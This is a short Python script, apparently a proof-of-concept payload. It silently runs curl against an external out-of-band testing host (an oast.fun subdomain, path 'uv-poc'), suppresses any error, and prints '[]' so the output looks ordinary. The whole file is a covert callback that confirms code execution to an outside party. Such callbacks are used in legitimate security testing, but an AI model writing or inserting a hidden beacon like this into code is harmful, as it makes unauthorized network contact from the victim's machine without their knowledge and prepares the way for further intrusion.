import subprocess
try:
    subprocess.call(["curl", "-sS", "--max-time", "20", "https://dc07pl9vnklashe99pggjyjdo5rfb3ijk.oast.fun/uv-poc"])
except Exception:
    pass
print("[]")
